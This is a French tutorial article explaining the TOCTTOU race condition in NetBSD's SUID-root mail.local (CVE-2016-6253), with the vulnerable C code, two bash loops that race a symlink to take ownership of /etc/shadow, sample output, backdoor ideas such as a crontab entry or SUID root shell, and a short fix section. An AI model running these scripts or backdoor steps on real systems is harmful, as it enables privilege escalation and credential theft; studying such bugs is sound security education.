=====================================================
Time Of Check To Time Of Use et Privilege Escalations
=====================================================

Quelques notes
==============

Le but de cet article est de dérouler un cas concret de Privilege Escalation
basé sur une Race Condition à cause d'une Time Of Check To Time Of Use dans
**mail.local** sur NetBSD (CVE-2016-6253).

Il s'agit d'une adaptation de http://akat1.pl/?id=2 que je remercie
grandement pour son excellent article. Par soucis de pédagogie j'ai pris
quelques raccourcis concernant l'exploitation de cette vulnérabilité au
profit d'une plus grande clarté sur les processus généraux.

Bref, pour du code qui fonctionne allez voir son blog ; ici on explique
surtout comment réutiliser le concept ailleurs.

Et maintenant, voyons cette course !

.. image:: https://derpicdn.net/img/view/2012/1/15/299__safe_rainbow+dash_pinkie+pie_applejack_vector_wallpaper_pony_race_jet_running+of+the+leaves.png
    :width: 100%

.. raw:: pdf

    PageBreak

Le bug
======

mail.local
----------

**mail.local** est un programme gérant les mails utilisateurs dans NetBSD.
Il a la particularité d'être SUID root ce qui signifie qu'il est lancé avec
les droits super utilisateurs même s'il est lancé par un autre utilisateur.
Cela introduit quelques restrictions sur son utilisation (impossible de
lancer **ptrace** sur le processus ou d'employer **LD_PRELOAD** par exemple).

Cependant les processus SUID sont généralement considérés comme de gros
risques de sécurité car la moindre vulnérabilité peut donner une escalade de
privilèges. C'est une de ces vulnérabilités que nous allons voir maintenant.

La fonction deliver
-------------------

Voici_ la fonction qui contient la vulnérabilité.

.. _Voici : https://nxr.netbsd.org/xref/src/libexec/mail.local/mail.local.c

.. code:: c

    static int
    deliver(int fd, char *name, int lockfile)
    {
    	struct stat sb;
    	struct passwd pwres, *pw;
    	char pwbuf[1024];
    	int created, mbfd, nr, nw, off, rval=EX_OK, lfd=-1;
    	char biffmsg[100], buf[8*1024], path[MAXPATHLEN], lpath[MAXPATHLEN];
    	off_t curoff;
    ...
    	(void)snprintf(path, sizeof path, "%s/%s", _PATH_MAILDIR, name);

    	if (!(created = lstat(path, &sb)) &&
    	    (sb.st_nlink != 1 || S_ISLNK(sb.st_mode))) {
    		logwarn("%s: linked file", path);
    		return(EX_OSERR);
    	}
    ...
    	if ((mbfd = open(path, O_APPEND|O_WRONLY|O_EXLOCK,
    	    S_IRUSR|S_IWUSR)) < 0) {
    		if ((mbfd = open(path, O_APPEND|O_CREAT|O_WRONLY|O_EXLOCK,
    		    S_IRUSR|S_IWUSR)) < 0) {
    			logwarn("%s: %s", path, strerror(errno));
    			return(EX_OSERR);
    		}
    	}
    ...
    	if (created)
    		(void)fchown(mbfd, pw->pw_uid, pw->pw_gid);
    ...
    	(void)fsync(mbfd);		/* Don't wait for update. */
    	(void)close(mbfd);		/* Implicit unlock. */

.. raw:: pdf

    PageBreak

En pseudo-python:

.. code:: python

    _PATH_MAILDIR = "/var/mail"

    def deliver(fd, name, lockfile):
        path    = _PATH_MAILDIR + "/" + name
        created = not exists(path)

        # On vérifie que ce n'est pas un lien symbolique
        if exists(path) and is_link(path):
            print("Le fichier est un lien:", path)
            return

        # On tente de l'ouvrir ou de le créer le cas échéant
        # Cette fonction suivra un lien symbolique si présent
        mbfd = open(path, "w")

        if not mbfd:
            print("Une erreur à la création du fichier a eu lieu")

        # Si le fichier n'existait pas avant on change l'owner pour
        # l'utilisateur courant (le vrai, pas root)
        if created:
            chown(uid, gid)

        mbfd.close()

Cet extrait de code est assez clair et prend même la peine de vérifier que le
fichier est un lien avant de le donner à *root* pour éviter qu'un utilisateur
normal ne puisse créer un lien vers */etc/shadow* par exemple et ainsi se
l'accaparer.

Et donc ? Où est le problème ?
------------------------------

On fait une vérification certes, mais ce programme n'est pas seul à tourner
sur l'ordinateur... Que se passe-t-il si un utilisateur crée un lien
symbolique entre la vérification de l'existence du fichier et son ouverture ?

.. raw:: pdf

    PageBreak

Exploitation
============

Principe de base
----------------

Ceci est un exemple classique de Race Condition. Dans ce cas on parle d'un
TOCTTOU_ (Time Of Check To Time Of Use), c'est à dire d'une race condition
dérivant d'un décalage entre le moment où l'on effectue la vérification et le
moment où l'on exécute une action normalement protégée par cette
vérification.

.. _TOCTTOU : https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use

En pratique ça ressemble à ça:

::

    mail.local                                    | Attaquant
    --------------------------------------------------------------------------
    Vérifie l'existence - Le fichier n'existe pas |
                                                  | Crée symlink malicieux
    Ouvre le fichier - Suis le lien symbolique    |
    Change le propriétaire                        |
                                                  | \o/ Profit !

Le bug est particulièrement agréable ici car il ne demande aucune corruption
mémoire (lesquelles sont souvent inévitables dans ce type de bug), c'est
vraiment une pure Race Condition.

Bon, mais la fenêtre est assez serrée, ce n'est pas comme si on pouvais lui
demander gentiment de faire une pause pour nous laisser lancer un **ln**.

Certes, mais rien ne nous oblige à n'essayer qu'une fois...

La fenêtre est trop petite qu'ils disaient !
--------------------------------------------

Aucune fenêtre temporelle n'est trop petite pour être exploitée ! (Parole de
Sliders_).

.. _Sliders : https://en.wikipedia.org/wiki/Sliders

Il nous faut une boucle infinie créant le lien symbolique puis le supprimant
afin d'essayer qu'il ne soit présent qu'au moment du changement de
propriétaire. Lancer mail.local dans la même boucle serait trop lent, nous
avons besoins de faire cela dans un processus séparé. Il faut également noter
que l'on est obligé de créer le fichier lorsque le lien est supprimé car
**chown** n'est exécute que si le fichier n'existait pas lors du premier test.

Pour notre attaque nous allons créer un lien **/var/mail/user** vers
**/etc/shadow**. Voici le script bash qui contient notre boucle principale,
**exploit.sh**.

.. code:: bash

    STEALPATH="/etc/shadow"
    MAILBOX="/var/mail/user"

    while true ; do
        rm "$MAILBOX"
        ln -s "$STEALPATH" "$MAILBOX"
        rm "$MAILBOX"
        touch "$MAILBOX"

        if [ "$(stat "$STEALPATH" -c '%u')" -eq 0 ] ; then
            echo "Yeah ! Réussi !
            break
        fi
    done

.. raw:: pdf

    PageBreak

La seconde boucle dans **mailer.sh** :

.. code:: bash

    while true ; do
        echo x | /usr/libexec/mail.local usr 2> /dev/null
    done

Et à l'exécution :

.. code:: bash

    user@netbsd-dev$ mailer.sh &
    [3] 1234
    user@netbsd-dev$ exploit.sh
    Yeah ! Réussi !

Le processus ne prend normalement que quelques secondes pour terminer avec
succès.

Ok, et ensuite ?
----------------

On peut obtenir n'importe quel fichier du système, les candidats classiques
sont **/etc/shadow** et le **crontab**. En ajoutant une entrée au crontab on
peut amener root à nous donner périodiquement ses droits. On peut aussi se
servir de ceci pour créer un script SUID lançant un shell avec les droits
roots ce qui serait une porte dérobée appréciable. Les possibilités sont
nombreuses.

Comment corriger
================

Le mieux pour éviter les TOCTTOU est de valider le fichier le plus tard
possible, après l'avoir ouvert par exemple (mais bien évidemment avant de
l'utiliser).
